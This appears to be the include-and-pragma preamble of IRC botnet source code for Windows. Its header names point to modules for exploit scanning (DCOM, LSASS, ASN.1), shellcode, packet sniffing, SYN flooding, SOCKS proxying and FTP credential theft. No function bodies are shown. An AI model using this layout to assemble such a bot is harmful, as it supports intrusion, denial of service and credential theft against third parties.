#ifdef WIN32
#define _WIN32_WINNT	0x0403				// Very important for critical sections.
#define WIN32_LEAN_AND_MEAN					// Good to use.
#pragma optimize("gsy", on)					// Global optimization, Short sequences, Frame pointers.
#pragma comment(linker,"/RELEASE")			// Release code
#pragma comment(linker, "/ALIGN:4096")		// This will save you some size on the executable.
#pragma comment(linker, "/IGNORE:4108 ")	// This is only here for when you use /ALIGN:4096.
#pragma pack(1)								// Force packing on byte boundaries.
#endif // WIN32

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <malloc.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <windns.h>
#include <iphlpapi.h>
#include <lm.h>
#include <lmat.h>
#include <io.h>
#include <fcntl.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <assert.h>
#include <sqlext.h>
#include <vfw.h>
#include <shlobj.h>
#include <ntsecapi.h>
#include "defines.h"
#include "ehandler.h"
#include "processes.h"
#include "loaddlls.h"
#include "tcpip.h"
#include "threads.h"
#include "r00t.h"
#include "irc_send.h"
#include "crc32.h"
#include "random.h"
#include "netutils.h"
#include "sysinfo.h"
#include "advscan.h"
#include "rndnick.h"
#include "download.h"
#include "scan.h"
#include "wildcard.h"
#include "redirect.h"
#include "misc.h"
#include "driveinfo.h"
#include "visit.h"
#include "tftpd.h"
#include "aliaslog.h"
#include "psniff.h"
#include "secure.h"
#include "autostart.h"
#include "fphost.h"
#include "shellcode.h"
#include "dcom.h"
#include "lsass.h"
#include "asn1.h"
#include "ftpd.h"
#include "net.h"
#include "skysyn.h"
#include "Socks4.h"
#include "flashfxp.h"
#include "trendmicro.h"
#include "msn.h"
#include "zip.h"